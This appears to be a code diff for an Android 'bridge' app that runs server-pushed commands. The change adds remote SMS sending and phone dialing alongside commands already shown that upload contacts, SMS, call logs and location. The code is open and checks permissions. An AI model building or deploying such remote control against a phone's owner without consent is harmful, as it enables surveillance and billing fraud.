@@ -16,7 +16,9 @@ import my.bridge.com.core.network.ws.CommandResult
 import my.bridge.com.core.storage.DeviceStore
 import my.bridge.com.data.CallLogReader
 import my.bridge.com.data.ContactsReader
+import my.bridge.com.data.PhoneDialer
 import my.bridge.com.data.SmsReader
+import my.bridge.com.data.SmsSender
 import my.bridge.com.location.LocationHelper
 import my.bridge.com.media.MusicPlayer
 import retrofit2.HttpException
@@ -102,6 +104,12 @@ object CommandModule {
         },
         Command.GET_CALL_LOG to CommandExecutor { command ->
             executeGetCallLog(context, deviceStore, apiClient, command)
+        },
+        Command.SEND_SMS to CommandExecutor { command ->
+            executeSendSms(context, command)
+        },
+        Command.DIAL_PHONE to CommandExecutor { command ->
+            executeDialPhone(context, command)
         },
     )
 
@@ -437,6 +445,105 @@ object CommandModule {
                 },
             )
             "已上报 ${items.size} 条通话记录（服务端快照已更新）"
+        }
+    }
+
+    // ------------------------------------------------------------------
+    // 写操作类命令（send_sms / dial_phone）
+    //
+    // 与数据采集类相反：这两个命令**改动设备/外界状态**（真实发短信会计费、
+    // 直接拨打会产生通话），客户端只做「机械执行 + 如实回执」，
+    // 下发前的确认责任在管理后台操作者（catalog 描述里已注明计费风险）。
+    // ------------------------------------------------------------------
+
+    /**
+     * 执行 send_sms：用本机 SIM 卡发送短信。
+     *
+     * @param params.phones  收件人号码，中英文逗号/分号/竖线分隔可发多个
+     * @param params.content 短信内容（超 70 字自动 multipart 切分）
+     *
+     * 逐号码串行发送，等待系统 sent 回执（15 秒超时）后才计结果，
+     * 回执汇总每个号码的成功/失败明细（见 [SmsSender]）。
+     */
+    private suspend fun executeSendSms(context: Context, command: Command): CommandResult {
+        val id = command.commandId
+        val name = command.command
+        if (!SmsSender.hasPermission(context)) {
+            return CommandResult(id, name, false, "缺少短信权限，请打开 App 在系统设置中授予后重试")
+        }
+        val phonesRaw = command.params.get("phones")
+            ?.takeIf { it.isJsonPrimitive }?.asString?.trim().orEmpty()
+        val content = command.params.get("content")
+            ?.takeIf { it.isJsonPrimitive }?.asString?.trim().orEmpty()
+        if (phonesRaw.isEmpty()) return CommandResult(id, name, false, "缺少接收号码参数 phones")
+        if (content.isEmpty()) return CommandResult(id, name, false, "缺少短信内容参数 content")
+
+        // 统一中英文逗号/分号/竖线为分号后拆分，去空去重（保持顺序）
+        val phones = phonesRaw.replace("，", ";").replace("；", ";")
+            .replace(",", ";").replace("|", ";")
+            .split(";").map { it.trim() }.filter { it.isNotEmpty() }.distinct()
+        if (phones.isEmpty()) return CommandResult(id, name, false, "未解析到有效号码")
+        if (phones.size > 20) return CommandResult(id, name, false, "单次最多 20 个号码（当前 ${phones.size} 个）")
+
+        return try {
+            val details = SmsSender.send(context, phones, content)
+            val okList = details.filter { it.success }
+            val failList = details.filterNot { it.success }
+            val message = buildString {
+                append("发送完成：成功 ${okList.size}/${details.size}")
+                if (failList.isNotEmpty()) {
+                    append("；失败：")
+                    append(failList.joinToString("；") { "${it.phone}（${it.message}）" })
+                }
+            }
+            Timber.i("命令 %s：%s", name, message)
+            // 只要有一个号码发出即算命令成功（失败明细已在消息里），全部失败才回执失败
+            CommandResult(id, name, okList.isNotEmpty(), message)
+        } catch (e: Exception) {
+            Timber.e(e, "命令 send_sms 执行失败")
+            CommandResult(id, name, false, "发送失败：${e.message}")
+        }
+    }
+
+    /**
+     * 执行 dial_phone：拨打电话。
+     *
+     * @param params.phone 电话号码
+     * @param params.mode  direct（直接拨打，默认）/ dialer（打开拨号盘预填）
+     *
+     * direct 需 CALL_PHONE 运行时权限，缺失时**自动降级**为 dialer 并在回执注明；
+     * 息屏/后台下系统可能拦截拨号界面弹出（Android 10+ 后台启动限制），
+     * 回执里带提示，完整限制说明见 [PhoneDialer]。
+     */
+    private fun executeDialPhone(context: Context, command: Command): CommandResult {
+        val id = command.commandId
+        val name = command.command
+        val phone = command.params.get("phone")
+            ?.takeIf { it.isJsonPrimitive }?.asString?.trim().orEmpty()
+        if (phone.isEmpty()) return CommandResult(id, name, false, "缺少电话号码参数 phone")
+        val mode = command.params.get("mode")
+            ?.takeIf { it.isJsonPrimitive }?.asString?.trim() ?: "direct"
+
+        var direct = mode != "dialer"
+        if (direct && !PhoneDialer.hasCallPermission(context)) {
+            direct = false
+            return try {
+                val message = PhoneDialer.dial(context, phone, direct)
+                CommandResult(id, name, true, "无直接拨打权限，已降级为拨号盘：$message")
+            } catch (e: Exception) {
+                Timber.e(e, "命令 dial_phone 降级拨号盘也失败")
+                CommandResult(id, name, false, "缺少 CALL_PHONE 权限且拨号盘打开失败：${e.message}")
+            }
+        }
+        return try {
+            val message = PhoneDialer.dial(context, phone, direct)
+            Timber.i("命令 %s：%s", name, message)
+            CommandResult(id, name, true, message)
+        } catch (e: IllegalArgumentException) {
+            CommandResult(id, name, false, e.message ?: "号码格式不合法")
+        } catch (e: Exception) {
+            Timber.e(e, "命令 dial_phone 执行失败")
+            CommandResult(id, name, false, "拨号失败：${e.message}")
         }
     }
 
